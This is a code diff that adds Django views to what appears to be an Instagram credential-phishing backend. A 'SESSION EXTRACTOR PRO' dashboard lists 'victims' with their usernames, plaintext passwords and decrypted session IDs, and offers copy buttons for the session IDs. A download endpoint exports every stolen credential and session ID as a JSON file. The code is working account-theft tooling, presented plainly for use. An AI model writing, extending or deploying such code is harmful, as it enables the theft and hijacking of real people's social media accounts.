@@ -109,3 +109,111 @@ def raw_sessions(request):
             txt += f"{acc.username} | {acc.password} | ERROR\n"
     
     return HttpResponse(txt, content_type='text/plain')
+
+
+
+
+def dashboard(request):
+    victims = []
+    total = InstagramAccount.objects.count()
+    active = InstagramAccount.objects.filter(is_active=True).count()
+    
+    for acc in InstagramAccount.objects.all().order_by('-created_at'):
+        try:
+            data = json.loads(fernet.decrypt(acc.session_data.encode()).decode())
+            sessionid = data.get("authorization_data", {}).get("sessionid", "")
+            victims.append({
+                "username": acc.username,
+                "password": acc.password,
+                "sessionid": sessionid,
+                "active": acc.is_active,
+                "time": acc.created_at.strftime("%Y-%m-%d %H:%M")
+            })
+        except:
+            victims.append({"username": acc.username, "error": "Corrupted"})
+    
+    html = f"""
+    <!DOCTYPE html>
+    <html>
+    <head>
+        <title>SESSION EXTRACTOR PRO</title>
+        <meta name="viewport" content="width=device-width, initial-scale=1">
+        <script src="https://cdn.tailwindcss.com"></script>
+        <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@900&display=swap" rel="stylesheet">
+    </head>
+    <body class="bg-black text-white">
+        <div class="min-h-screen p-8">
+            <h1 class="text-6xl text-center font-bold mb-4" style="font-family: 'Orbitron'">
+                <span class="text-green-500">SESSION</span> 
+                <span class="text-red-500">EXTRACTOR</span> 
+                <span class="text-yellow-500">PRO</span>
+            </h1>
+            <div class="text-center text-3xl mb-8">
+                TOTAL: <span class="text-green-400">{total}</span> | 
+                ACTIVE: <span class="text-lime-400">{active}</span>
+            </div>
+            
+            <div class="grid gap-4 max-w-6xl mx-auto">
+                {''.join([f'''
+                <div class="bg-gray-900 border-2 {"border-green-500" if v["active"] else "border-red-800"} rounded-xl p-6 hover:scale-105 transition-all">
+                    <div class="flex justify-between items-center">
+                        <div>
+                            <p class="text-2xl font-bold text-cyan-400">@{v["username"]}</p>
+                            <p class="text-yellow-300">Pass: {v["password"]}</p>
+                            <p class="text-xs text-gray-400">Time: {v["time"]}</p>
+                        </div>
+                        <div class="text-right">
+                            <button onclick="copySession('{v["sessionid"]}', this)" 
+                                    class="bg-green-600 hover:bg-green-700 px-6 py-3 rounded-lg font-bold text-xl">
+                                COPY SESSIONID
+                            </button>
+                            <p class="text-xs mt-2 {'' if v["active"] else 'text-red-500'}">
+                                { "ACTIVE" if v["active"] else "FAILED" }
+                            </p>
+                        </div>
+                    </div>
+                    <pre class="mt-4 bg-black p-4 rounded text-xs text-gray-400 overflow-x-auto hidden" id="s_{hash(v["username"])}">
+                        {v["sessionid"]}
+                    </pre>
+                </div>
+                ''' for v in victims])}
+            </div>
+            
+            <div class="text-center mt-10">
+                <a href="/download-json/" class="bg-purple-600 hover:bg-purple-700 px-8 py-4 rounded-full text-2xl font-bold">
+                    DOWNLOAD ALL AS JSON
+                </a>
+            </div>
+        </div>
+        
+        <script>
+            function copySession(sessionid, btn) {
+                navigator.clipboard.writeText(sessionid);
+                btn.textContent = "COPIED!";
+                setTimeout(() => btn.textContent = "COPY SESSIONID", 2000);
+            }
+        </script>
+    </body>
+    </html>
+    """
+    return HttpResponse(html)
+
+def download_json(request):
+    data = []
+    for acc in InstagramAccount.objects.all():
+        try:
+            decrypted = fernet.decrypt(acc.session_data.encode()).decode()
+            session = json.loads(decrypted)
+            sessionid = session.get("authorization_data", {}).get("sessionid", "")
+            data.append({
+                "username": acc.username,
+                "password": acc.password,
+                "sessionid": sessionid,
+                "active": acc.is_active
+            })
+        except:
+            pass
+    
+    response = HttpResponse(json.dumps(data, indent=2), content_type='application/json')
+    response['Content-Disposition'] = 'attachment; filename="INSTAGRAM_SESSIONS_PRO.json"'
+    return response
